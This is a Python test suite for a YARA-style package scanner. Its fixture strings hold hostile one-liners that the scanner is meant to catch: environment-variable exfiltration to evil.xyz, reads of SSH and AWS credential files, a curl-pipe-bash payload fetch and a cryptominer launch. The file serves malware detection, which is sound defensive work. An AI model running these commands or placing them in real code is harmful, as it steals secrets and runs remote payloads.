"""Tests for YARA-compatible rule scanner."""

import tempfile
from pathlib import Path

from app.scanners.yara_scanner import YARAScanner
from app.schemas.package import PackageInfo


def _scanner() -> YARAScanner:
    return YARAScanner()  # Uses default rules directory


def _pkg() -> PackageInfo:
    return PackageInfo(name="test", version="1.0.0")


def _write(content: str, suffix: str = ".js") -> Path:
    p = Path(tempfile.mktemp(suffix=suffix))
    p.write_text(content)
    return p


async def test_detect_base64_exec():
    """YARA rule: base64_exec_payload should detect base64+eval."""
    f = _write("eval(Buffer.from('payload','base64').toString());")
    try:
        result = await _scanner().scan(_pkg(), [f])
        assert result.verdict in ("warn", "fail")
        assert "base64" in result.details.lower() or "yara" in result.details.lower()
    finally:
        f.unlink(missing_ok=True)


async def test_detect_env_exfiltration():
    """YARA rule: environment_exfiltration should detect env+network."""
    f = _write("const d=JSON.stringify(process.env);fetch('https://evil.xyz/?d='+d);")
    try:
        result = await _scanner().scan(_pkg(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_credential_access():
    """YARA rule: credential_file_access should detect multiple cred paths."""
    f = _write("fs.readFileSync('~/.ssh/id_rsa');fs.readFileSync('~/.aws/credentials');")
    try:
        result = await _scanner().scan(_pkg(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_cryptominer():
    """YARA rule: cryptocurrency_miner should detect mining indicators."""
    f = _write("exec('curl stratum+tcp://pool.minexmr.com | xmrig');")
    try:
        result = await _scanner().scan(_pkg(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_detect_curl_pipe_bash():
    """YARA rule: install_script_dropper should detect curl|bash."""
    f = _write("system('curl https://evil.xyz/payload.sh | bash');")
    try:
        result = await _scanner().scan(_pkg(), [f])
        assert result.verdict in ("warn", "fail")
    finally:
        f.unlink(missing_ok=True)


async def test_clean_code_passes():
    """Normal code should not trigger YARA rules."""
    f = _write("const express = require('express');\nconst app = express();\napp.listen(3000);")
    try:
        result = await _scanner().scan(_pkg(), [f])
        assert result.verdict == "pass"
    finally:
        f.unlink(missing_ok=True)


async def test_empty_artifacts_passes():
    result = await _scanner().scan(_pkg(), [])
    assert result.verdict == "pass"


async def test_rules_loaded():
    scanner = _scanner()
    assert len(scanner._rules) > 0, "YARA rules should be loaded from data/yara_rules/"
